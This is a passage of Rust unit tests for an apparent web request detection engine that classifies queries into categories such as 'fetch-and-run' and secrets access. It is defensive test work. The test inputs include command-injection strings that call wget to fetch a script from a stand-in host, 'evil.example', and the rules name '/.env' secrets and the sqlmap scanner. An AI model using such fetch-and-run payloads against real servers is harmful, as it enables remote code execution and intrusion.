        let too_far = "a".repeat(385);
        let q_far = format!("/?cmd=wget+{too_far}https://evil.example/a.sh");
        assert_eq!(SignatureEngine::builtin().classify_query(&q_far), "");
    }

    #[test]
    fn custom_fetch_and_run_regex_in_json_is_honored() {
        let tmp = std::env::temp_dir().join(format!("guardd-sig-test-{}.json", std::process::id()));
        let payload = serde_json::json!({
            "version": "test-custom",
            "decisive": ["secrets"],
            "paths": {"/.env": "secrets"},
            "segments": {".env": "secrets"},
            "traps": [],
            "queries": {
                "fetch-and-run": "custom_fetch_marker_[0-9]+"
            },
            "user_agents": {"sqlmap": "scanner-tool"}
        });
        std::fs::write(&tmp, payload.to_string()).unwrap();
        let eng = SignatureEngine::from_file(&tmp).unwrap();
        let _ = std::fs::remove_file(&tmp);
        assert_eq!(
            eng.classify_query("/?x=custom_fetch_marker_42"),
            "fetch-and-run"
        );
        assert_eq!(eng.classify_query("/?x=wget+https://evil.example/a.sh"), "");
    }
}
